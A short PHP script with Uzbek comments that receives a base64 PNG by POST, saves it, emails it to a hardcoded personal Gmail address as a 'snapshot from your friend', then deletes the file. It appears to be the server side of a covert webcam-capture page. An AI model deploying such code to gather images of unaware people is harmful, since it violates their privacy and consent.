<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $imageData = $_POST['image'];

    // Rasmdan "data:image/png;base64," qismini olib tashlash
    $imageData = str_replace('data:image/png;base64,', '', $imageData);
    $imageData = str_replace(' ', '+', $imageData);
    $image = base64_decode($imageData);

    // Rasmni vaqtinchalik fayl sifatida saqlash
    $filePath = 'snapshot.png';
    file_put_contents($filePath, $image);

    // Email ma'lumotlari
    $to = 'sherzodbekdavronov111@gmail.com';
    $subject = 'New Snapshot';
    $message = 'Here is a snapshot from your friend!';
    $headers = "From: sherzoddavronov8212@gmsil.com\r\n";
    $headers .= "Content-Type: multipart/mixed; boundary=\"PHP-mixed-\";\r\n";

    // Emailning tarkibi
    $attachment = chunk_split(base64_encode($image));
    $body = "--PHP-mixed-\r\n";
    $body .= "Content-Type: text/plain; charset=\"UTF-8\"\r\n";
    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $body .= $message . "\r\n\r\n";
    $body .= "--PHP-mixed-\r\n";
    $body .= "Content-Type: image/png; name=\"snapshot.png\"\r\n";
    $body .= "Content-Transfer-Encoding: base64\r\n";
    $body .= "Content-Disposition: attachment\r\n\r\n";
    $body .= $attachment . "\r\n\r\n";
    $body .= "--PHP-mixed--";

    // Emailni jo'natish
    mail($to, $subject, $body, $headers);

    // Vaqtinchalik faylni o'chirish
    unlink($filePath);
}
?>
